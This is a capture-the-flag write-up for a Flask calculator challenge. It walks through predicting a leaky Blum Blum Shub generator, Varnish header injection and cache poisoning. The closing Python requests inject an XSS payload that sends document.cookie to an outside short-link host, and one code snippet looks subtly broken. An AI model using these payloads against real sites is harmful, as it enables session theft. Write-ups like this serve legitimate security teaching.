# Advanced Calc

## The app

The app is a python flask script with some endpoint

- `/`: The main page with a calculator form and a button to trigger the bot
- `/view/<string:expression_id>` : The page that shows the result of an example of embed process
- `/embed/<string:expression_id>` : The page that shows the result of expression
- `/reset`: Reset session, pretty useless in the exploit

Details:

- Every calc_session is calculated with a Blum Blum Shup random number generator.
- Every expression is is calculated with calc_session, original_expression and a Blum Blum Shup random as secret key.
- In addition to the usual operators are also present:

```python
result,original = calculate(expression, replace_rule={
    'RANDOM': lambda: next(rng),
    'INTDIV': lambda x,y: x // y,
    'INTMOD': lambda x,y: x % y,
    'FACT': lambda x:  factorial(x),
    'RES': lambda: calc_sessions[g.calc_session_id]['last_result']
    }
)
```

## Bugs

### Predict random number generator

While normally the output from the random number generator algorithm BlumBlumShub is assembled from the lower j bits of several iterations, in this case, the function returns the complete current state of the rng. Knowing that, we can perform a statistical analysis over the distribution of the random numbers generated, massively reducing the search space and making a brute-force attack easy to execute.

### Header injection + Cache poisoning

We want to cache `/embed` pages.

Under this page we have cookie so Varnish by default ignore the cache. We can "bypass" this behavior with a temp var between `vcl_recv` and `vcl_backend_fetch` and between `vcl_backend_response` and `vcl_deliver`.
But during this steps we urldecode the cookie and because varnish is vulnerable to header injection we can inject content before caching process.

So using this bug by visiting `/embed/{expression_id}?calc_session={something}%0d%0a%0d%0a{payload}` we can add content directly to the page.

## Exploitation

### Predict calc_session and expression_id

Using the `${RANDOM}-${RANODM}....` operator we can ask 3003 subsequence random numbers.

We can make retrieve the value M used in the BlumBlumShub algorithm, by analyzing the random numbers generated. We first calculate an educated guess with the formula `highest + (highest - n) // n`. With 3000 samples, the actual value of that is typically off by 200k - 300k. With that knowledge we can do an offline bruteforce attack, starting from our prediction and then moving outwards, using a, b and c to check if the chosen value is equal to M. Once we have retrieved M we can always predict the next random number from the current state.
```python
n = len(numbers)
highest = max(numbers)

prediction = int(highest + (highest - n) // n)

M = -1
for i in range(prediction):
    pn = prediction + i
    if (a*a) % pn == b and (b*b) % pn == c:
        M = pn
        break
    pni = prediction - i
    if (a*a) % pni == b and (b*b) % pni == c:
        M = pni
        break

assert M != -1, M
```

> **_NOTE:_** The next steps stricly depends on how many request will you do to the server in the exploit

So, the next session_id will be 

```python
session_id = (numbers[-1] * numbers[-1]) % M
```

And the bot's next expression_id will be

```python
expression_id = sha256(f'15+18{session_id}{(session_id[-1] * session_id[-1]) % M}').hexdigest()
```

### Cache poisoning + XSS

With the information taken in the previous step, we can insert some payload in the cache.

Let's take a look to `script-src` in the CSP: `self`

So we have to make a script like this `<script src='/embed/a' ></script>`. This means that we have to inject **TWO** entry in the cache.

Make some shit:

```python

# Here we are strict to 46 chars 'cause the Content-Lenght of `[SYSTEM ERROR] Expression id not found. Retry.`

xss_payload = "top.location=`//t.ly/OTzDs?`+document.cookie;" 
requests.get(f'/embed/X?calc_session={session_id}%0d%0a%0d%0a{xss_payload}')

xss_payload = "<script src='/embed/X'></script>" 
requests.get(f'/embed/{expression_id}?calc_session={session_id}%0d%0a%0d%0a{xss_payload}')

```

Perfect now we can run the bot :)
